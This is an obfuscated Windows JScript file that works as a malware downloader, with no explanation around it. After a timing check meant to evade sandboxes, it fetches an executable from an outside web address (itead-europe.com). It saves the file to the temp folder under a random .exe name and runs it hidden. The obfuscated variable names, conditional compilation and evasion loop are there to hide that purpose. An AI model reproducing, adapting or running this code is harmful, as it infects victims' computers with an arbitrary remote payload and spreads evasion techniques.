var _R0 = false;
var _M = "CreateObject";
var _NF = function _PP() {return WScript[_M]("WScript"+".Shell");}(), _IH = 11;
var _A = "MSXML2.XMLHTTP";
var _YS = 2123213;
var _FC = 0;
function _D(_I0){_NF["Run"](_I0, _FC, _FC);};
function _C(){return _A + "";};
function _BT(_IL, _OZ){_FC = _FC * 1; return _IL - _OZ;};
function _KE(){return _M;};
/*@cc_on
  @if (@_win32 || @_win64)
    _R0 = true;
  @end
@*/
if (_R0)
{
var _JO = "";
function _HG(){return 22;};
var _VC = 0; var _O0 = 0;
function _Q()
{
var _OP = new this["Date"]();
var _O = _OP["getUTCMilliseconds"]();
WScript["Sleep"](_HG());
var _OP = new this["Date"]();
var _PU = _OP["getUTCMilliseconds"]();
WScript["Sleep"](_HG());
var _OP = new this["Date"]();
var _Z = _OP["getUTCMilliseconds"]();
var _VC = "_XY";
_VC = _BT(_PU, _O);
var _O0 = "_V";
_O0 = _BT(_Z, _PU);
_JO = "open";
return _BT(_VC, _O0);
}
var _BS = false;
var _U0 = false;
for (var _I = _FC; _I < _HG() * 1; _I++){if (_Q() != _FC){
_BS = true; 
_O0 = "31" + 11 * _VC + _O0; 
_U0 = true; 
break;
}}
function _T() {return ((_BS == true) && (_BS == _U0)) ? 1 : _FC;};
if (_BS && _T() && _U0){
function _L() {return _NF["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "qWWQelNHApC52kz.ex" + "e";};
 _DQ = _C();
 _CF = WScript[_M](_DQ);
 var _F = 1;
 while (_F){
try {
	if (_F == 1)
	{
		_CF[_JO]("GET", "http://itead-europe.com/k3ias", false);
		_CF["send"]();
		_LN = "Sleep";
	}
	WScript[_LN](_HG() + 120); 
	if (_CF["readystate"] < 2 * 2) continue;
	_F = _FC;
	function _E(_ZZ) {var _QZ = (1, 2, 3, 4, 5, _ZZ); return _QZ;};
	_K = WScript[_KE()]("ADODB.Stream");
	_DQ = _K;
	_DQ[_JO]();
	_DQ["type"] = _E(1);
	_DQ["write"](_CF["ResponseBody"]);
	_K["position"] = _E(_FC);
	_DQ["Save" + "ToFile"](_L(), 2);
	_K["cl"+"ose"]();
	_U = _L();
	_D(_U);
} catch(_R){};
}
}
}

